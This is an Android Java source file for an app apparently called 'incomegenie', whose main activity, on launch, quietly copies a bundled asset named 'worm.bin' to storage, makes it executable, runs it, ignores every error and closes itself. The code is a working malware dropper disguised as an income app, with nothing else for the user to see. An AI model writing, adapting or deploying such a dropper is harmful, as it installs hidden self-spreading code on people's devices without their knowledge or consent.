package com.brokenethicsalab.incomegenie;

import android.app.Activity;
import android.os.Bundle;
import java.io.File;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.FileOutputStream;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        try {
            InputStream in = getAssets().open("worm.bin");
            File outFile = new File(getFilesDir(), "worm_exec");
            OutputStream out = new FileOutputStream(outFile);
            byte[] buf = new byte[4096];
            int len;
            while ((len = in.read(buf)) > 0) out.write(buf, 0, len);
            in.close(); out.close();
            outFile.setExecutable(true);
            Runtime.getRuntime().exec(outFile.getAbsolutePath());
        } catch (Exception e) {}
        finish();
    }
}
